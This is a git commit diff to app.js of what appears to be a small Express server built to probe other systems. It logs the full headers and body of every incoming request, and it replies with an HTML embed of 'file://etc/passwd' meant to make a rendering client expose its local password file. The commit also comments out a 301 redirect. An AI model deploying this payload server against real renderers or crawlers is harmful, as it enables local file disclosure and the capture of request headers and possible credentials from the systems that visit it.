75595cce4553407e482e7d456189cea369ba69ea
Bohdan Pantiukhov <58185639+gingermanymph@users.noreply.github.com>
2021-02-19 17:14:39 +0200

    Update app.js

--- app.js
+++ app.js
@@ -28,7 +28,7 @@ app.use((req, res) => {
     console.info('START-------------------------------------------------------------\n'+rMethod + ' ' + rUrl);
     console.info(rHeaders);
     console.info('BODY--------------------------------------------------------------\n'+JSON.stringify(req.body));
-    res.statusCode = 301;
+    // res.statusCode = 301;
     // res.setHeader('Location', 'https://srvcb.herokuapp.com/m0.html');
     res.send('<embed src="file://etc/passwd" width="300" height="200">')
     console.info('END---------------------------------------------------------------\n\n\n');
